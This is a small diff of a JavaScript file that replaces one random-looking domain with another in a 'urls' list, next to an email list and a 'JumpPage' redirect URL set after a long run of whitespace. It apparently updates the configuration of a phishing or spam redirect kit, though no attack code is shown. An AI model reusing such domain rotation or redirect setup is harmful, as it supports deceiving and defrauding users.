@@ -37,7 +37,7 @@ var emails = [
 ];
 
 var urls=[
-	'khzreodu.com',
+	'xhgrrxot.cc',
 ];
                                                                                                                   
 var JumpPage="https://swagc.com";
